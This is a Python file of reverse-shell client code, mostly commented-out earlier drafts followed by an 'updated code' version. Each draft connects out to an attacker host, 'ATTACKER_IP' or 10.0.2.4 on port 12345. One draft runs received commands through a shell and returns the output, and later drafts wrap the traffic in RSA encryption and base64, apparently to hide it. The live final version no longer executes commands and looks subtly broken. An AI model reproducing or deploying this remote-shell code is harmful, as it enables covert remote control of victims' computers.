# # from cryptidy import asymmetric_encryption

# # priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key

# # some_python_objects = ['foo', 'bar'], 'some long string', 12
# # encrypted = asymmetric_encryption.encrypt_message(some_python_objects, pub_key)
# # timestamp, original_object = asymmetric_encryption.decrypt_message(encrypted, priv_key) 

# ################################################################################################3

# import socket
# import subprocess
# import os

# HOST = 'ATTACKER_IP'  # Attacker's IP address
# PORT = 12345  # Same port number used in the listener
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((HOST, PORT))

# while True:
#     data = s.recv(1024)
#     if data[:2].decode('utf-8') == 'cd':
#         os.chdir(data[3:].decode('utf-8'))
#     if len(data) > 0:
#         cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#         output_bytes = cmd.stdout.read() + cmd.stderr.read()
#         output_str = str(output_bytes)
#         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
#     else:
#         s.send(str.encode(' '))
# s.close()

# from cryptography.hazmat.primitives import serialization
# from cryptography.hazmat.primitives.asymmetric import rsa
# from cryptography.hazmat.backends import default_backend
# from cryptography.hazmat.primitives import hashes
# from cryptography.hazmat.primitives.asymmetric import padding

# import socket
# import subprocess
# import os

# def generate_rsa_keys():
#     private_key = rsa.generate_private_key(
#         public_exponent=65537,
#         key_size=2048,
#         backend=default_backend()
#     )
#     public_key = private_key.public_key()
#     return private_key, public_key

# def encrypt_message(message, public_key):
#     encrypted = public_key.encrypt(
#         message.encode(),
#         padding.OAEP(
#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
#             algorithm=hashes.SHA256(),
#             label=None
#         )
#     )
#     return encrypted

# def decrypt_message(encrypted, private_key):
#     decrypted = private_key.decrypt(
#         encrypted,
#         padding.OAEP(
#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
#             algorithm=hashes.SHA256(),
#             label=None
#         )
#     )
#     return decrypted.decode()

# HOST = '10.0.2.4'  # Attacker's IP address
# PORT = 12345  # Same port number used in the listener
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((HOST, PORT))

# private_key, public_key = generate_rsa_keys()

# while True:
#     data = s.recv(1024)
#     if data[:2].decode('utf-8') == 'cd':
#         os.chdir(data[3:].decode('utf-8'))
#     if len(data) > 0:
#         encrypted_data = encrypt_message(data.decode('utf-8'), public_key)
#         s.send(encrypted_data)
#     else:
#         s.send(b' ')
# s.close()

# from cryptidy import asymmetric_encryption
# import socket
# import subprocess
# import os

# HOST = '10.0.2.4'  # Attacker's IP address
# PORT = 12345  # Same port number used in the listener
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((HOST, PORT))

# priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key

# while True:
#     data = s.recv(1024)
#     if data[:2].decode('utf-8') == 'cd':
#         os.chdir(data[3:].decode('utf-8'))
#     if len(data) > 0:
#         encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
#         s.send(encrypted_data)
#     else:
#         s.send(b' ')
# s.close()

# updated code
from cryptidy import asymmetric_encryption
import socket
import subprocess
import os
import base64

HOST = '10.0.2.4'  # Attacker's IP address
PORT = 12345  # Same port number used in the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key

while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
        encrypted_data_b64 = base64.b64encode(encrypted_data)
        s.send(encrypted_data_b64)
    else:
        s.send(b' ')
s.close()
